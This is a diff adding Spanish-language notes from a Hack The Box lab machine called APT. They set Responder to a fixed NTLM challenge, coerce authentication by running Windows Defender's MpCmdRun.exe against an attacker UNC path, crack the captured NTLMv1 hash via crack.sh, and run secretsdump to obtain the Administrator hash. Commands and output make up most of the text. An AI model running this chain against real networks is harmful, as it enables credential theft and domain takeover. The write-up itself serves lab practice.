@@ -1,0 +1,43 @@
+[*] Maquina practicada APT
+[*] Podremos romper este cifrado debido a que es un cifrado debil, de esta forma
+
+[*] Nos pondremos en escucha con el responder para obtener en el futuro hash, pero antes de esto deberemos de configurar el Responder.conf, para despues romper el hash
+
+  ~$> nvim /usr/share/responder/Responder.conf
+
+[*] Deberemos de cambiar el Challenge
+
+  > #Challenge = Random
+  > Challenge = 1122334455667788
+
+[*] Ahora nos pondremos en escucha con el responder
+
+  ~$> responder -I tun0 --lm
+
+[*] Ahora desde la victima deberemos de irnos a este path C:\Program Files\Windows Defender, para ejecutar la siguiente instruccion
+
+  > .\MpCmdRun.exe -scan -ScanType 3 -File \\10.10.14.57\test
+
+[*] Esto nos hara obtener el hash por el responder
+
+
+  [+] Output:
+    APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
+
+[*] Despues de esto, nos descargaremos este repo -> https://github.com/evilmog/ntlmv1-multi
+
+[*] Ejecutaremos el programa de esta forma
+
+  ~$> python3 ntlmv1.py --ntlmv1 'APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788'
+
+  [+] Output:
+    To Crack with crack.sh use the following token
+    NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
+
+[*] Nos iremos a crack.sh, y meteremos ese hash, nos mandaran un email con el hash de APT$
+
+[*] Ahora solo tendriamos que hacer lo siguiente con secretsdump
+
+  ~$> secretsdump.py 'htb.local/APT$@apt.htb' -hashes :d167c3238864b12f5f82feae86a7f798
+
+[+] Ya tendriamos el hash de Administrator para acceder como Administrator
